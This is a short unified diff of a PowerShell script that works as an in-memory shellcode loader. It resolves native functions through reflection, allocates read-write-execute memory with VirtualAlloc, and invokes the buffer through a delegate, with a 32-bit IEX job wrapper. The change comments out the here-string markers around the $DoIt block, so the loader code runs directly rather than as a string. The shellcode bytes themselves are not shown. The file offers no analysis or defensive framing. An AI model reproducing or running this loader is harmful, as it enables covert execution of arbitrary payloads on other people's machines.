@@ -1,6 +1,6 @@
 Set-StrictMode -Version 2
 
-$DoIt = @'
+#$DoIt = @'
 function func_get_proc_address {
 	Param ($var_module, $var_procedure)		
 	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
@@ -33,7 +33,7 @@ $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
 
 $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
 $var_runme.Invoke([IntPtr]::Zero)
-'@
+#'@
 
 If ([IntPtr]::size -eq 8) {
 	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
